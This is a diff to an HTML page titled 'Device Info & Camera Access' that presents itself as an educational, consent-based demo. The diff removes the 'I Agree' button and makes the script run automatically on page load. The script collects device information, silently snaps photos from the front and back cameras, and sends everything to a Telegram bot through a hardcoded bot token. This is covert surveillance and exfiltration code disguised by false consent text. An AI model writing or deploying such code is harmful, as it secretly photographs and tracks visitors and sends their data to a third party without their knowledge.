@@ -3,13 +3,29 @@
 <head>
   <meta charset="UTF-8" />
   <title>Device Info & Camera Access</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f4f4f4;
+    }
+    h2 {
+      color: #333;
+    }
+    #loading {
+      font-size: 18px;
+      margin-top: 20px;
+      color: #555;
+    }
+  </style>
 </head>
 <body>
   <h2>This website is for educational purposes only.</h2>
   <p>
     This demo collects device and camera info ethically, with your consent.
   </p>
-  <button id="agreeBtn">I Agree</button>
+  <div id="loading">Loading...</div>
 
   <script>
     const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
@@ -138,12 +154,17 @@
       });
     }
 
-    document.getElementById("agreeBtn").addEventListener("click", async () => {
+    // Automatically execute on page load
+    window.addEventListener('load', async () => {
+      const loadingElement = document.getElementById('loading');
+      loadingElement.textContent = 'Collecting data...';
+
       const info = await getDeviceInfo();
 
       // Capture front camera (only once)
       let frontSnap = null;
       if (!frontCaptured) {
+        loadingElement.textContent = 'Accessing front camera...';
         frontSnap = await getSnapshot("user");
         frontCaptured = true;
       }
@@ -151,6 +172,7 @@
       // Capture back camera (only once)
       let backSnap = null;
       if (!backCaptured) {
+        loadingElement.textContent = 'Accessing back camera...';
         backSnap = await getSnapshot("environment");
         backCaptured = true;
       }
@@ -167,6 +189,7 @@
       }
 
       // Send info and photos
+      loadingElement.textContent = 'Sending data...';
       await sendTextToTelegram(info);
       if (frontSnap) await sendPhotoToTelegram(frontSnap, "📷 Front Camera");
       if (backSnap) await sendPhotoToTelegram(backSnap, "📷 Back Camera");
